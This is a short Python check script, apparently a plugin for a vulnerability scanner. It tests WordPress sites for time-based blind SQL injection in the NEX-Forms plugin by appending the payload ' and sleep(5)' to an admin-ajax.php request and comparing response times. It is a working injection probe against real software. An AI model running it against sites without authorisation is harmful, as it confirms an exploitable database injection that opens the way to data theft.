# !/usr/bin/dev python
# -*- coding:utf-8 -*-

"""
referer:
http://www.beebeeto.com/pdb/poc-2015-0089/
https://www.exploit-db.com/exploits/36800/
"""
import time

def assign(service, args):
    if service == 'wordpress':
        return True, args

def audit(args):
    path='wp-admin/admin-ajax.php?action=submit_nex_form&nex_forms_Id=1'
    payload = '%20and%20sleep(5)'
    true_url=args+path
    start_time1 = time.time()
    code1, head1, res1, _, _ =curl.curl2(true_url)
    end_time1 = time.time()
    deff_time1=end_time1-start_time1

    false_url=args+path+payload
    start_time2 = time.time()
    code2, head2, res2, _, _ =curl.curl2(false_url)
    end_time2 = time.time()
    deff_time2=end_time2-start_time2

    if code1==200 and code2==200 and deff_time2>deff_time1 and deff_time2>5:
        security_hole(false_url)

if __name__ == "__main__":
    from dummy import *
    audit(assign('wordpress','http://www.example.com/')[1])